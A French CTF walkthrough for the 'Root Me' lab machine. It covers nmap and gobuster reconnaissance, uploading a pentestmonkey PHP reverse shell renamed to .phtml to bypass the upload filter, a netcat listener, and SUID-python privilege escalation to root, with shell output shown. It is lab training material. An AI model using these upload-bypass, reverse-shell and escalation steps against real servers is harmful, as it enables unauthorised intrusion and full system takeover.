# Root Me

## I- Scanning

On utilise nmap `nmap -sC -sV <target ip>` ou tu peux faire un nmap agressif `nmap -A <target ip>` ou encore `nmap -sV <target ip>`

On regarde les ports ouvert et en fonction on peut essayer de se connecter aux services disponible (ex: HTTP, SSH, SMB etc…)

* Ici on peut voir un service SSH et un serveur web qui fait tourner Apache httpd 2.4.29

## II- Enumération

On utilise **gobuster** lors de cette étape pour découvrir les dossier présent sous la page web:

`gobuster dir -u http://<ip-cible> -w <wordlist>`

```jsx
gobuster dir -u http://<ip-cible> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

chemin de wordlists:

* /usr/share/wordlists/dirb/common.txt
* /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
* /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
* /usr/share/wordlists/rockyou.txt

On obtient deux dossiers particulièrement intéressant: /uploads et /panel On se connecte pour regarder ces dossiers

La page /panel/ est particulièrement intéressante

## III- Exploitation

Nous allons pouvoir faire un reverse shell, on peut utiliser un revershe shell php de pentestmonkey: [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

`git clone <https://github.com/pentestmonkey/php-reverse-shell`>

On donne les permissions:

```powershell

chmod +x php-reverse-shell.php
```

On edit le script pour que l’IP soit l’IP ATTAQUANTE et on peut également changer le port sur lequel l’on souhaite écouter (1234 ou encore 6666). Si la page n’autorise pas d’upload des fichiers php, il y a d’autres alternatives:

* php3
* php4
* php5
* phtml

```powershell

mv php-reverse-shell.php php-reverse-shell.phtml
```

Ensuite va sur la page /uploads/ de plus tôt, il y a notre fichier reverse shell, nous pouvons mtn lancé un netcat pour écouter sur le port spécifier dans notre reverse shell

```powershell
nc -lvnp 4444
```

Sur la page uploads, on clique sur notre fichier pour l’exécuter et on check le terminal, opération réussie !

Nous devons maintenant trouver la location du fichier ruser.txt et l’ouvrir

```powershell
find / -name user.txt 2>/dev/null
```

## IV- Escalation de privilège

Maintenant que nous avons un shell, nous pouvons passer en root.

Nous allons d’abord regarder les permissions SUID:

```powershell
find / -type f -user root -perm -4000 2>/dev/null
```

Nous avons /usr/bin/python qui pourrait être utilisé pour faire une escalation de privilège: [https://gtfobins.github.io/](https://gtfobins.github.io/)

On recherche python et on va jusqu’à la catégorie SUID

```
sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data
```

Nous pouvons maintenant chercher le fichier root

```powershell
find / -name root.txt 2>/dev/null
```
